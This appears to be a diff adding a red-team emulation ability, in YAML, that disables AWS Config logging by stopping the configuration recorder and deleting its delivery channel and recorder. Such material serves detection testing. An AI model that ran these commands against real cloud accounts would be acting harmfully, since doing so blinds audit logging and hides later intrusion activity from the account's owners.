@@ -1,0 +1,25 @@
+---
+- id: 07db09f3167a5b2ff5028f2ad270449f
+  name: AWS - Config Logs Disabled
+  description: 'Disables AWS Config by stopping the configuration recorder, deleting
+    the delivery channel, and deleting the configuration recorder. An attacker with
+    sufficient permissions can use this to stop configuration change recording and
+    avoid detection of subsequent activity.
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.002
+    name: 'Disable or Modify Tools: Disable or Modify Cloud Log'
+  platforms:
+    unknown:
+      sh:
+        command: aws configservice stop-configuration-recorder --configuration-recorder-name
+          redatomictestconfigurationrecorder --region us-west-2; echo "*** Configuration
+          recorder stopped ***"; aws configservice delete-delivery-channel --delivery-channel-name
+          redatomictestdeliverychannel --region us-west-2; echo "*** Delivery channel
+          deleted ***"; aws configservice delete-configuration-recorder --configuration-recorder-name
+          redatomictestconfigurationrecorder --region us-west-2; echo "*** Configuration
+          recorder deleted ***"
+        payloads: []
+        cleanup: aws configservice list-configuration-recorders --region us-west-2
